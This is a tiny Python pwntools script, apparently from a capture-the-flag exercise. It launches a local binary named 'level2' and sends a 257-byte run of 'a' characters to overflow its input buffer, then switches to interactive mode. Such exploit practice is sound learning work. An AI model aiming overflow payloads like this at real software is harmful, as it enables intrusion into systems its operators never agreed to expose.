#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

r = process("./level2")
w = r.recv()
print w

payload = 'a'*0x101
r.sendline(payload)

r.interactive()

